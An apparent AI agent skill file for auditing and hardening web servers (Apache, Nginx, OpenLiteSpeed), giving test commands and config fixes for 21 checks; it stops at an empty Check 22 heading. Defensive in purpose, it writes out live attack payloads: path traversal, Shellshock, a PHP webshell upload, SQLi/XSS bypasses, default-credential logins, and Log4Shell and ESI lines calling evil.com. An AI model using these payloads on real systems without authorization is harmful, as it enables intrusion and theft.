---
name: webserver-security
description: Use when auditing or hardening a web server — Apache httpd, Nginx, OpenLiteSpeed, LiteSpeed, Caddy, IIS, or any HTTP server. Triggers on: web server security, server hardening, Apache security, Nginx security, OpenLiteSpeed security, LiteSpeed security, nginx.conf audit, httpd.conf audit, .htaccess security, server headers, server version disclosure, directory listing, TLS audit, SSL configuration, cipher suites, HSTS, HTTP security headers, CSP header, server misconfiguration, mod_security, WAF bypass, reverse proxy security, virtual host security, server-status exposure, nginx_status, directory traversal, path traversal, request smuggling, slow loris, BREACH attack, CORS misconfiguration, clickjacking, server banner, ServerTokens, server_tokens, file exposure, .env exposed, .git exposed, admin panel exposed, rate limiting, connection limits, HTTP methods, TRACE method, nikto scan, testssl, server fingerprinting.
---

# Web Server Security

## Mission

Act as a web server security engineer. Audit any HTTP server (Apache, Nginx, OpenLiteSpeed, LiteSpeed, Caddy, IIS) across 22 check categories. Cover configuration hardening, TLS, headers, access control, known exploits, and server-specific attack vectors. Assume every server has gaps. Find them all. Produce a prioritised fix plan with exact config snippets.

---

## Non-negotiable rules

- **Read-only audit** — never modify server configs directly. Output config patches only; operator applies them.
- **Never brute-force production** — rate limit tests use single requests only. No automated credential attacks without explicit authorization.
- **Never exploit confirmed vulnerabilities** — report path traversal / RCE / SSRF findings; do not chain them.
- **Measure, don't estimate** — quote exact header values, exact TLS grades, exact file paths found.
- **Require authorization for active scanning** — nikto, nuclei, gobuster against production require explicit user confirmation first.

---

## Mode detection

State execution mode at the top of every report.

### Mode 1 — Live server (preferred)
Direct access to server URL. Use `curl`, `testssl.sh`, `nikto`, `nmap`, Playwright MCP for header/response inspection.

### Mode 2 — Config file audit
No running server. Inspect `nginx.conf`, `httpd.conf`, `.htaccess`, `lighttpd.conf`, `ls.conf` files directly.

```bash
# Find all server config files
find /etc/nginx /etc/apache2 /etc/httpd /usr/local/lsws -name "*.conf" 2>/dev/null
find / -name ".htaccess" -not -path "*/node_modules/*" 2>/dev/null | head -30
```

### Mode 3 — Passive reconnaissance
Only domain/IP provided. Use DNS, HTTP headers, certificate transparency to fingerprint server without sending aggressive traffic.

---

## Initial state to declare

Before starting checks, output:

```
Target: <URL or config path>
Server: <detected — Apache X.X / Nginx X.X / OLS X.X / Unknown>
Mode: <1 / 2 / 3>
Auth for active scanning: <YES / NO — confirm before nikto/nuclei/gobuster>
```

---

## Check 1 — Server version and banner disclosure

**Risk: Medium** — version reveals exact CVEs to target.

```bash
# Check Server header
curl -sI https://target.com | grep -i "server:\|x-powered-by:\|x-generator:\|x-aspnet"

# Nikto fingerprint (requires authorization)
nikto -h https://target.com -Tuning 1

# WhatWeb passive fingerprint
whatweb -a 1 https://target.com
```

**What to check:**
- `Server: Apache/2.4.51 (Ubuntu)` → full version exposed
- `X-Powered-By: PHP/8.1.2` → PHP version exposed
- `X-AspNet-Version`, `X-AspNetMvc-Version` → .NET stack exposed
- `X-Generator: Drupal 9` → CMS fingerprint

**Fix — Apache:**
```apache
ServerTokens Prod          # Only "Apache" — no version
ServerSignature Off        # Remove version from error pages
Header unset X-Powered-By
Header always unset X-Powered-By
```

**Fix — Nginx:**
```nginx
server_tokens off;         # Hides nginx version
more_clear_headers Server; # Remove entirely (requires headers-more module)
# Or set custom value:
add_header Server "webserver";
```

**Fix — OpenLiteSpeed:**
```
WebAdmin Console → Server → General → Hide Version: Yes
# Or in ls.conf: hideServerSignature 1
```

---

## Check 2 — HTTP security headers

**Risk: High** — missing headers enable XSS, clickjacking, MIME sniffing, downgrade attacks.

```bash
# Fetch all response headers
curl -sI https://target.com | sort

# Or check via securityheaders.com API
curl "https://securityheaders.com/?q=https://target.com&followRedirects=on"
```

**Required headers audit:**

| Header | Required value | Missing impact |
|--------|----------------|----------------|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | HTTPS downgrade attacks |
| `Content-Security-Policy` | Site-specific allowlist | XSS, injection |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking |
| `X-Content-Type-Options` | `nosniff` | MIME sniffing XSS |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Referer leakage |
| `Permissions-Policy` | `geolocation=(), camera=(), microphone=()` | Feature abuse |
| `Cross-Origin-Opener-Policy` | `same-origin` | Spectre side-channel |
| `Cross-Origin-Embedder-Policy` | `require-corp` | Cross-origin isolation |
| `Cross-Origin-Resource-Policy` | `same-site` | Cross-origin reads |
| `Cache-Control` (sensitive) | `no-store, no-cache` | Sensitive data caching |

**Headers to REMOVE:**
- `Server` (version string)
- `X-Powered-By`
- `X-AspNet-Version`
- `X-AspNetMvc-Version`

**Fix — Apache:**
```apache
<IfModule mod_headers.c>
    Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Permissions-Policy "geolocation=(), camera=(), microphone=()"
    Header always set Cross-Origin-Opener-Policy "same-origin"
    Header always set Cross-Origin-Embedder-Policy "require-corp"
    Header always set Cross-Origin-Resource-Policy "same-site"
    Header unset X-Powered-By
    Header always unset X-Powered-By
</IfModule>
```

**Fix — Nginx:**
```nginx
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Embedder-Policy "require-corp" always;
add_header Cross-Origin-Resource-Policy "same-site" always;
# ⚠ add_header inheritance gotcha: headers in parent block are NOT inherited
# when child block has its own add_header — repeat in every location block
```

**Fix — OpenLiteSpeed:**
```
WebAdmin → Virtual Host → General → Custom Response Headers:
  Header always set X-Frame-Options "DENY"
  # Or use .htaccess (OLS supports Apache .htaccess syntax)
```

---

## Check 3 — TLS/SSL configuration

**Risk: Critical** — weak TLS = interceptable traffic, MITM.

```bash
# testssl.sh — comprehensive TLS audit (most important tool)
testssl.sh --severity HIGH https://target.com

# Or targeted checks
testssl.sh --protocols --ciphers --headers https://target.com

# sslyze
sslyze --regular target.com

# Online: SSL Labs API
curl "https://api.ssllabs.com/api/v3/analyze?host=target.com&publish=off&all=done"

# nmap TLS scripts
nmap --script ssl-enum-ciphers -p 443 target.com
```

**What to check:**
- SSLv2, SSLv3, TLS 1.0, TLS 1.1 → **must be disabled**
- TLS 1.2 + TLS 1.3 → **required**
- Weak ciphers: RC4, DES, 3DES, MD5, EXPORT, NULL, ANON
- Certificate: expiry, CN/SAN match, self-signed, chain complete
- OCSP stapling: enabled
- HSTS: present and sufficient max-age
- Forward secrecy: ECDHE/DHE key exchange
- Certificate Transparency: SCT present

**Fix — Apache:**
```apache
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite TLSv1.3 TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
SSLCipherSuite TLSv1.2 ECDH+AESGCM:ECDH+CHACHA20:!aNULL:!MD5:!DSS:!RC4:!3DES
SSLHonorCipherOrder on
SSLUseStapling on
SSLStaplingCache "shmcb:${APACHE_RUN_DIR}/ssl_stapling(32768)"
SSLSessionTickets off
```

**Fix — Nginx:**
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDH+AESGCM:ECDH+CHACHA20:!aNULL:!MD5:!DSS:!RC4:!3DES;
ssl_prefer_server_ciphers on;
ssl_session_cache shared:SSL:10m;
ssl_session_timeout 1d;
ssl_session_tickets off;
ssl_stapling on;
ssl_stapling_verify on;
resolver 8.8.8.8 8.8.4.4 valid=300s;
resolver_timeout 5s;
```

**Fix — OpenLiteSpeed:**
```
WebAdmin → Listeners → SSL → Protocol:
  Uncheck: SSL v3, TLS v1.0, TLS v1.1
  Check: TLS v1.2, TLS v1.3
  Ciphers: ECDH+AESGCM:!aNULL:!MD5:!RC4
```

---

## Check 4 — Directory listing

**Risk: High** — exposes file structure, source code, configs, backups.

```bash
# Direct test
curl -s https://target.com/uploads/ | grep -i "index of\|parent directory"
curl -s https://target.com/backup/ | grep -i "index of"
curl -s https://target.com/tmp/ | grep -i "index of"

# Common directories to test
for dir in uploads backup tmp logs old assets static images css js fonts; do
  code=$(curl -so /dev/null -w "%{http_code}" "https://target.com/$dir/")
  echo "$dir: $code"
done
```

**Fix — Apache:**
```apache
<Directory /var/www/html>
    Options -Indexes -Includes -ExecCGI
    AllowOverride None
</Directory>
# Or globally in httpd.conf:
Options -Indexes
```

**Fix — Nginx:**
```nginx
autoindex off;   # Default is off, but verify explicitly in all location blocks
location /uploads/ {
    autoindex off;
}
```

**Fix — OpenLiteSpeed:**
```
WebAdmin → Virtual Host → General → Enable Directory Listing: No
```

---

## Check 5 — HTTP methods

**Risk: Medium–High** — TRACE enables XSS, unsafe methods enable file manipulation.

```bash
# Test allowed methods
curl -sI -X OPTIONS https://target.com | grep -i "allow:"
curl -sI -X TRACE  https://target.com | head -5
curl -sI -X DELETE https://target.com/test.txt
curl -sI -X PUT    https://target.com/test.txt -d "test"
curl -sI -X CONNECT https://target.com

# Detect TRACE XSS
curl -X TRACE https://target.com -H "Cookie: session=test123"
```

**What is dangerous:**
- `TRACE` → cross-site tracing (XST) — can steal cookies even with HttpOnly
- `DELETE` / `PUT` → file deletion/upload if WebDAV enabled
- `CONNECT` → proxy abuse

**Fix — Apache:**
```apache
TraceEnable Off
<LimitExcept GET POST HEAD>
    Order deny,allow
    Deny from all
</LimitExcept>
# Or with mod_rewrite:
RewriteEngine On
RewriteCond %{REQUEST_METHOD} ^(TRACE|TRACK|DELETE|PUT|CONNECT)
RewriteRule .* - [F]
```

**Fix — Nginx:**
```nginx
if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|PATCH)$ ) {
    return 405;
}
# Specifically block TRACE:
if ($request_method = TRACE) {
    return 405;
}
```

---

## Check 6 — Sensitive file and directory exposure

**Risk: Critical** — exposed configs, credentials, source code.

```bash
# Test critical paths
PATHS=(
  "/.env" "/.env.local" "/.env.production" "/.env.backup"
  "/.git/config" "/.git/HEAD" "/.git/COMMIT_EDITMSG"
  "/.htpasswd" "/.htaccess"
  "/wp-config.php" "/wp-config.php.bak"
  "/config.php" "/database.yml" "/database.php"
  "/composer.json" "/composer.lock" "/package.json"
  "/Dockerfile" "/docker-compose.yml"
  "/.DS_Store" "/Thumbs.db"
  "/backup.zip" "/backup.tar.gz" "/site.zip"
  "/phpinfo.php" "/info.php" "/test.php"
  "/.well-known/security.txt"
)
for path in "${PATHS[@]}"; do
  code=$(curl -so /dev/null -w "%{http_code}" "https://target.com${path}")
  [ "$code" != "404" ] && [ "$code" != "403" ] && echo "⚠  EXPOSED [$code]: $path"
done
```

**Fix — Apache:**
```apache
# Block .git, .env, .htpasswd, backup files
<FilesMatch "(^\.env|\.git|\.htpasswd|\.bak|\.backup|\.zip|\.tar\.gz|composer\.lock|package\.json)">
    Require all denied
</FilesMatch>

# Block .git directory entirely
<DirectoryMatch "^/.*/\.git/">
    Require all denied
</DirectoryMatch>
```

**Fix — Nginx:**
```nginx
# Block sensitive files
location ~* (\.env|\.git|\.htpasswd|\.bak|backup|\.DS_Store|composer\.lock|package\.json) {
    return 403;
}
location ~ /\.git {
    deny all;
}
location ~ /\.ht {
    deny all;
}
```

---

## Check 7 — Admin interfaces and status endpoints

**Risk: High** — exposed monitoring/admin reveals server internals or grants access.

```bash
# Apache server-status
curl -s https://target.com/server-status
curl -s https://target.com/server-info

# Nginx status
curl -s https://target.com/nginx_status
curl -s https://target.com/stub_status

# PHP info
curl -s https://target.com/phpinfo.php
curl -s https://target.com/phpinfo
curl -s https://target.com/info.php

# Common admin paths
ADMIN_PATHS=("/admin" "/administrator" "/wp-admin" "/phpmyadmin" "/adminer"
             "/_profiler" "/debug" "/.well-known" "/metrics" "/health" "/status")
for path in "${ADMIN_PATHS[@]}"; do
  code=$(curl -so /dev/null -w "%{http_code}" "https://target.com${path}")
  echo "$path: $code"
done
```

**Fix — Apache:**
```apache
<Location /server-status>
    Require ip 127.0.0.1 ::1
</Location>
<Location /server-info>
    Require all denied
</Location>
```

**Fix — Nginx:**
```nginx
location /nginx_status {
    stub_status on;
    allow 127.0.0.1;
    deny all;
}
```

**Fix — OpenLiteSpeed WebAdmin Console:**
```
Default port 7080 / 8088 — restrict to management IP only:
WebAdmin → Server → Security → Access Control:
  Allow: 192.168.1.0/24   # management subnet only
  Deny: ALL
# Or firewall rule:
iptables -A INPUT -p tcp --dport 7080 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 7080 -j DROP
```

---

## Check 8 — Path traversal and directory traversal

**Risk: Critical** — read files outside web root.

```bash
# Basic traversal tests
curl "https://target.com/../../../../etc/passwd"
curl "https://target.com/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "https://target.com/..%2F..%2F..%2Fetc%2Fpasswd"
curl "https://target.com/....//....//....//etc/passwd"

# Nginx alias off-by-slash (critical Nginx-specific)
# If config has: location /files { alias /var/www/uploads/; }
curl "https://target.com/files../etc/passwd"
# Note: missing trailing slash on location triggers this

# Apache mod_rewrite traversal
curl "https://target.com/index.php?page=../../../etc/passwd"
curl "https://target.com/index.php?page=....//....//etc/passwd"

# Nuclei path traversal templates (requires auth)
nuclei -u https://target.com -t path-traversal/
```

**Nginx alias off-by-slash fix:**
```nginx
# WRONG — vulnerable:
location /files {
    alias /var/www/uploads/;
}
# CORRECT — trailing slash on both:
location /files/ {
    alias /var/www/uploads/;
}
```

**Fix — Apache:**
```apache
<Directory />
    Options None
    AllowOverride None
    Require all denied
</Directory>
<Directory /var/www/html>
    Options -Indexes -Includes -FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
# Disable FollowSymLinks to prevent symlink escapes
```

---

## Check 9 — CORS misconfiguration

**Risk: High** — wildcard CORS with credentials = cross-origin credential theft.

```bash
# Test CORS headers
curl -sI -H "Origin: https://evil.com" https://target.com/api/ | grep -i "access-control"

# Test with credentials
curl -sI -H "Origin: https://evil.com" \
         -H "Access-Control-Request-Method: GET" \
         https://target.com/api/user

# Check reflected origin (dangerous pattern)
curl -sI -H "Origin: https://attacker.example.com" https://target.com/api/
# If response has: Access-Control-Allow-Origin: https://attacker.example.com → VULNERABLE
```

**Dangerous patterns:**
- `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` → invalid per spec but some servers misconfigure
- Origin reflection without validation: server echoes back whatever Origin header is sent
- Null origin: `Access-Control-Allow-Origin: null` → exploitable via sandboxed iframes
- Subdomain wildcard regex: `\.example\.com` — allows `evil.example.com`

**Fix — Apache:**
```apache
<IfModule mod_headers.c>
    # Explicitly whitelist — never use * with credentials
    SetEnvIf Origin "^https://(www\.)?yourdomain\.com$" ALLOWED_ORIGIN=$0
    Header always set Access-Control-Allow-Origin "%{ALLOWED_ORIGIN}e" env=ALLOWED_ORIGIN
    Header always set Access-Control-Allow-Methods "GET, POST, OPTIONS"
    Header always set Access-Control-Allow-Headers "Authorization, Content-Type"
    Header always set Access-Control-Max-Age "3600"
    # Never: Access-Control-Allow-Origin: * with Allow-Credentials: true
</IfModule>
```

**Fix — Nginx:**
```nginx
map $http_origin $cors_origin {
    default "";
    "https://www.yourdomain.com" $http_origin;
    "https://app.yourdomain.com" $http_origin;
}
add_header Access-Control-Allow-Origin $cors_origin always;
add_header Vary Origin always;
```

---

## Check 10 — Rate limiting and DoS protection

**Risk: High** — unprotected servers susceptible to brute force and resource exhaustion.

```bash
# Test rate limiting on login endpoints
for i in $(seq 1 20); do
  code=$(curl -so /dev/null -w "%{http_code}" -X POST https://target.com/login \
         -d "user=test&pass=wrong")
  echo "Request $i: $code"
done
# Expected: 429 after N attempts. If 200/401 every time → no rate limit

# Slowloris test (requires explicit authorization)
# pip install slowloris
# slowloris target.com --port 443 --sleeptime 5

# Test request size limits
curl -X POST https://target.com/upload \
     --data-binary @/dev/urandom \
     --max-time 10 \
     -o /dev/null -w "%{http_code}\n"
```

**Fix — Apache (mod_ratelimit + mod_reqtimeout):**
```apache
# Slowloris mitigation
RequestReadTimeout header=20-40,minrate=500 body=20,minrate=500

# Rate limit bandwidth (mod_ratelimit)
<Location /login>
    SetOutputFilter RATE_LIMIT
    SetEnv rate-limit 400   # 400 bytes/sec
</Location>

# Request size limits
LimitRequestBody 10485760        # 10MB max body
LimitRequestFields 100           # max 100 headers
LimitRequestFieldSize 8190       # max header line length
LimitRequestLine 8190            # max request line length
```

**Fix — Nginx:**
```nginx
# Connection and request rate limits
limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
limit_req_zone  $binary_remote_addr zone=req_limit:10m rate=10r/s;

server {
    limit_conn conn_limit 20;              # max 20 connections per IP
    limit_req  zone=req_limit burst=20 nodelay;

    location /login {
        limit_req zone=req_limit burst=5 nodelay;
    }

    # Timeout tuning (Slowloris mitigation)
    client_body_timeout   10s;
    client_header_timeout 10s;
    keepalive_timeout     5s 5s;
    send_timeout          10s;

    # Size limits
    client_max_body_size     10m;
    client_body_buffer_size  128k;
    large_client_header_buffers 4 16k;
}
```

**Fix — OpenLiteSpeed:**
```
WebAdmin → Server → Tuning:
  Max Connections: 10000
  Connection Timeout: 30
  Keep-Alive Timeout: 5
WebAdmin → Server → Security:
  Per Client Throttle: 1000 req/s
  Soft Limit: 250, Hard Limit: 500
```

---

## Check 11 — Compression attacks (BREACH/CRIME)

**Risk: Medium** — HTTPS compression leaks secrets via oracle attack.

```bash
# Check if gzip/deflate applied to responses with sensitive data
curl -sI -H "Accept-Encoding: gzip, deflate" https://target.com/api/session \
  | grep -i "content-encoding"

# Check if TLS compression enabled (CRIME)
testssl.sh --compression https://target.com
```

**CRIME:** TLS-level compression (rare in modern servers, should be off).  
**BREACH:** HTTP-level gzip on responses containing secrets (CSRF tokens, session IDs).

**Fix — Apache:**
```apache
# Disable compression on sensitive endpoints
<LocationMatch "/(api|login|session|auth|token)">
    SetEnv no-gzip dont-vary
</LocationMatch>
# Or disable entirely for authenticated pages
<IfModule mod_deflate.c>
    SetEnvIfNoCase Request_URI \.(?:gif|jpe?g|png|gz|zip)$ no-gzip dont-vary
</IfModule>
```

**Fix — Nginx:**
```nginx
# Disable gzip for sensitive API paths
location /api/ {
    gzip off;
}
# Never compress responses that include CSRF tokens or session data
```

---

## Check 12 — Reverse proxy and host header injection

**Risk: High** — host header manipulation leads to SSRF, cache poisoning, password reset hijacking.

```bash
# Host header injection
curl -sI -H "Host: evil.com" https://target.com
curl -sI -H "Host: target.com:3000" https://target.com
curl -sI -H "X-Forwarded-Host: evil.com" https://target.com
curl -sI -H "X-Forwarded-For: 127.0.0.1" https://target.com

# SSRF via proxy
curl "https://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"
curl "https://target.com/proxy?url=http://localhost:8080/admin"

# Nginx misconfigured proxy_pass trailing slash
# Config: location /api { proxy_pass http://backend; }
# vs:     location /api/ { proxy_pass http://backend/; }
curl "https://target.com/api../etc/passwd"

# Test internal port forwarding
curl -sI -H "Host: localhost:8080" https://target.com
```

**Fix — Nginx:**
```nginx
# Explicit server_name — reject undefined hosts
server {
    listen 80 default_server;
    server_name _;
    return 444;    # Drop connection — no response
}

server {
    listen 80;
    server_name yourdomain.com www.yourdomain.com;
    # ... actual config
}

# Proxy: always set upstream Host explicitly
proxy_set_header Host $host;
proxy_set_header X-Real-IP $remote_addr;
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
proxy_set_header X-Forwarded-Proto $scheme;

# Block X-Forwarded-Host spoofing
proxy_set_header X-Forwarded-Host "";
```

**Fix — Apache:**
```apache
# Default vhost to catch unknown hosts
<VirtualHost *:80>
    ServerName _default_
    Redirect 444 /
</VirtualHost>

# Validate Host header in app layer
UseCanonicalName On
```

---

## Check 13 — Request smuggling

**Risk: Critical** — bypass front-end security controls, poison caches, hijack requests.

```bash
# Install smuggler
pip3 install requests
git clone https://github.com/defparam/smuggler
cd smuggler && python3 smuggler.py -u https://target.com

# Or use HTTP Request Smuggler (Burp extension)
# Manual CL.TE test:
curl -s "https://target.com/" \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data "0\r\n\r\nX"

# Check server handling inconsistency (proxy + backend different parsers)
```

**Fix — Nginx (as reverse proxy):**
```nginx
# Reject ambiguous requests
proxy_http_version 1.1;
proxy_set_header Connection "";    # Force HTTP/1.1 keepalive — prevents TE issues
# Use HTTP/2 end-to-end where possible (eliminates classic smuggling)

# Reject requests with both Content-Length and Transfer-Encoding
```

**Fix — Apache:**
```apache
# Ensure consistent parsing
# Use mod_security rule to reject conflicting headers:
SecRule REQUEST_HEADERS:Transfer-Encoding "chunked" \
    "id:1001,phase:1,deny,status:400,\
     chain,msg:'Request Smuggling Attempt'"
SecRule REQUEST_HEADERS:Content-Length "!@eq 0"
```

---

## Check 14 — CGI, SSI, and script execution

**Risk: Critical** — remote code execution via CGI or SSI.

```bash
# Test CGI execution
curl "https://target.com/cgi-bin/test.cgi"
curl "https://target.com/cgi-bin/printenv"

# Test SSI injection via input fields
curl "https://target.com/page" --data "name=<!--#exec cmd='id'-->"

# ShellShock (CVE-2014-6271) — Apache CGI + bash
curl -H 'User-Agent: () { :;}; echo "Content-Type: text/plain"; echo; id' \
     https://target.com/cgi-bin/test.cgi
```

**Fix — Apache:**
```apache
# Disable CGI globally unless required
<IfModule mod_cgi.c>
    Options -ExecCGI
</IfModule>
# Disable SSI
Options -Includes
# Remove .cgi and .sh from executable list
RemoveHandler cgi-script .cgi .pl .py .sh
```

**Fix — Nginx:**
```nginx
# Nginx doesn't execute CGI natively — ensure FastCGI is not misconfigured
# Never pass arbitrary file types to PHP-FPM:
location ~ \.php$ {
    # Use try_files to prevent non-existent file execution
    try_files $uri =404;
    fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
}
# Block PHP execution in upload directories:
location ~* /uploads/.*\.php$ {
    deny all;
}
```

---

## Check 15 — PHP file upload and execution bypass

**Risk: Critical** — upload .php file disguised as image, execute RCE.

```bash
# Test if PHP executes in upload dirs
echo "<?php system('id'); ?>" > test.php
curl -F "file=@test.php" https://target.com/upload
curl https://target.com/uploads/test.php

# Extension bypass attempts
# .php.jpg, .php5, .phtml, .pHp, .PHP, .php%00.jpg
curl -F "file=@shell.php;filename=shell.php.jpg" https://target.com/upload
```

**Fix — Apache:**
```apache
# Disable script execution in upload directories
<Directory /var/www/html/uploads>
    Options -ExecCGI
    php_flag engine off
    RemoveHandler .php .php5 .phtml .shtml
    <FilesMatch "\.php$">
        Require all denied
    </FilesMatch>
</Directory>
```

**Fix — Nginx:**
```nginx
location ~* /uploads/ {
    # Disable PHP execution in uploads
    location ~* /uploads/.*\.(php|php5|phtml|phar)$ {
        deny all;
    }
}
```

---

## Check 16 — .htaccess security (Apache/OpenLiteSpeed)

**Risk: Medium–High** — .htaccess can override security settings or be exposed itself.

```bash
# Test .htaccess exposure
curl -s https://target.com/.htaccess
curl -s https://target.com/subdir/.htaccess

# Test if .htaccess overrides work (attacker-controlled .htaccess in upload dir)
# Upload .htaccess to writable dir and test if it executes
```

**Fix — Apache:**
```apache
# Deny access to .htaccess files
<Files ".htaccess">
    Require all denied
</Files>

# Restrict AllowOverride where full trust not needed
<Directory /var/www/html/uploads>
    AllowOverride None     # Prevent .htaccess in this dir from doing anything
</Directory>

# Minimum AllowOverride for known dirs
<Directory /var/www/html>
    AllowOverride AuthConfig Indexes    # Only allow auth + index directives
</Directory>
```

---

## Check 17 — Nginx-specific attack vectors

**Risk: Various** — Nginx has unique configuration traps.

```bash
# Test off-by-slash alias traversal (already in Check 8)
curl "https://target.com/static../etc/passwd"

# Test merge_slashes (double-slash bypass)
# Default: merge_slashes on — but if off:
curl "https://target.com//etc/passwd"
curl "https://target.com/%2F%2Fetc%2Fpasswd"

# Test regex location bypass
curl "https://target.com/admin.css"   # Bypasses /admin location if using prefix match only
curl "https://target.com/..;/admin"   # Spring framework bypass via Nginx

# HTTP/2 Rapid Reset (CVE-2023-44487) — check Nginx version
nginx -v 2>&1 | grep version
# Vulnerable: < 1.25.3 (if http2 enabled)
```

**Nginx-specific checklist:**
```nginx
# 1. Always use exact or regex matches for security-critical locations
location = /admin { ... }       # Exact match — safest
location ^~ /admin/ { ... }     # Prefix match — blocks regex bypass

# 2. merge_slashes should be ON (default)
merge_slashes on;

# 3. Disable server_tokens
server_tokens off;

# 4. add_header inheritance — repeat headers in EVERY location block
# (child block with add_header does NOT inherit parent's add_header)

# 5. resolver security — use trusted resolver, set timeout
resolver 127.0.0.1 valid=30s;
resolver_timeout 5s;

# 6. Disable unused modules
# Check: nginx -V 2>&1 | grep -o -- '--with-[^ ]*' | sort
```

---

## Check 18 — Apache-specific attack vectors

```bash
# Apache Killer — Range header DoS (CVE-2011-3192)
curl --header "Range: bytes=0-,5-0,5-1,5-2,5-3,5-4" https://target.com/

# mod_status leakage
curl -s https://target.com/server-status?auto

# mod_info leakage
curl -s https://target.com/server-info

# .htaccess injection (if user-supplied content can create .htaccess)

# CVE-2021-41773 / CVE-2021-42013 — Apache 2.4.49/2.4.50 path traversal
curl "https://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl "https://target.com/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
# ^^^ Only if Apache 2.4.49 or 2.4.50 — patch immediately

# Apache SSRF via RewriteRule
```

**Apache-specific hardening:**
```apache
# Hide Apache internals
ServerTokens Prod
ServerSignature Off
TraceEnable Off

# Disable mod_status / mod_info in production
<IfModule mod_status.c>
    <Location /server-status>
        Require ip 127.0.0.1
    </Location>
</IfModule>

# Prevent symlink attacks
Options -FollowSymLinks
# Or: Options +SymLinksIfOwnerMatch (safer)

# File descriptor limits (Apache Killer mitigation)
# Update Apache to 2.2.21+ or apply mod_headers rule:
RequestHeader edit Range "^bytes=\d+-\d+(,\s*\d+-\d+){150,}" "bytes=0-"
```

---

## Check 19 — OpenLiteSpeed-specific attack vectors

```bash
# WebAdmin Console exposure
curl -sk https://target.com:7080/
curl -sk https://target.com:8088/

# Default credentials: admin/123456
# Test login
curl -sk -X POST https://target.com:7080/login \
  -d "username=admin&password=123456"

# ESI injection (ESI enabled by default in OLS)
curl "https://target.com/page?name=<esi:include%20src='http://evil.com/steal.js'/>"

# LiteSpeed Cache plugin RCE (WordPress)
# CVE-2024-28000 — unauthenticated privilege escalation via crawler simulation
curl "https://target.com/wp-json/litespeed/v1/cdn_status"

# OLS server header exposes version
curl -sI https://target.com | grep -i "server:"
# Expected: LiteSpeed → verify no version number

# .htaccess compatibility — same Apache rules apply
curl -s https://target.com/.htaccess
```

**OpenLiteSpeed-specific hardening:**
```
1. Change WebAdmin password (default: 123456)
   WebAdmin → Admin → Change Password

2. Restrict WebAdmin access by IP:
   WebAdmin → Server → Security → Allowed IP: 192.168.1.0/24

3. Change WebAdmin port (default 7080):
   /usr/local/lsws/admin/conf/admin_config.conf
   adminport 18443

4. Disable ESI if not needed:
   WebAdmin → Virtual Hosts → [vhost] → General → Enable ESI: No

5. Keep LiteSpeed Cache plugin updated (critical — many CVEs)
   wp plugin update litespeed-cache

6. Hide version:
   WebAdmin → Server → General → Hide Version: Yes

7. Enable ModSecurity (built-in):
   WebAdmin → Server → Security → ModSecurity: On
   Rule Set: OWASP CRS
```

---

## Check 20 — WAF and ModSecurity

```bash
# Detect WAF presence
wafw00f https://target.com

# Test WAF bypass (requires authorization)
# SQL injection bypass attempts
curl "https://target.com/search?q=1'OR'1'='1"
curl "https://target.com/search?q=1%27%20OR%20%271%27%3D%271"
curl "https://target.com/search?q=1/**/OR/**/1=1"

# XSS WAF bypass
curl "https://target.com/search?q=<img/src=x onerror=alert(1)>"
curl "https://target.com/search?q=<svg/onload=alert(1)>"

# nikto WAF evasion test
nikto -h https://target.com -evasion 1234567

# Nuclei WAF detection
nuclei -u https://target.com -t http/technologies/waf-detect.yaml
```

**ModSecurity setup:**
```apache
# Apache — enable ModSecurity with OWASP CRS
LoadModule security2_module modules/mod_security2.so
<IfModule security2_module>
    SecRuleEngine On
    SecRequestBodyAccess On
    SecResponseBodyAccess On
    SecResponseBodyMimeType text/plain text/html application/json
    # OWASP CRS rules
    Include /usr/share/modsecurity-crs/crs-setup.conf
    Include /usr/share/modsecurity-crs/rules/*.conf
</IfModule>
```

```nginx
# Nginx — ModSecurity v3
load_module modules/ngx_http_modsecurity_module.so;
http {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsecurity/modsecurity.conf;
}
```

---

## Check 21 — Log injection and log poisoning

**Risk: Medium** — inject malicious entries into logs to hide activity or exploit log viewers.

```bash
# Log injection via User-Agent header
curl -H "User-Agent: Mozilla\r\nX-Injected: malicious-entry" https://target.com

# Newline injection
curl -H $'User-Agent: test\r\n127.0.0.1 - - [01/Jan/2024] "GET /admin HTTP/1.1" 200 0' \
     https://target.com

# Log4Shell via headers (CVE-2021-44228) — if Java app behind server
curl -H "X-Forwarded-For: \${jndi:ldap://evil.com/exploit}" https://target.com
curl -H "User-Agent: \${jndi:ldap://evil.com/exploit}" https://target.com
curl -H "X-Api-Version: \${jndi:ldap://evil.com/exploit}" https://target.com
```

**Fix — Apache:**
```apache
# Sanitize logged headers
LogFormat "%h %l %u %t \"%{User-Agent}i\" \"%r\" %>s %b" custom
# Use mod_log_forensic to capture raw request without log injection risk
```

**Fix — Nginx:**
```nginx
# Set log_format to escape special characters
log_format main escape=json
    '{"remote_addr":"$remote_addr","request":"$request","status":"$status",'
    '"user_agent":"$http_user_agent"}';
# JSON escaping prevents newline injection
```

---

## Check 22 — Miscellaneous hardening checklist

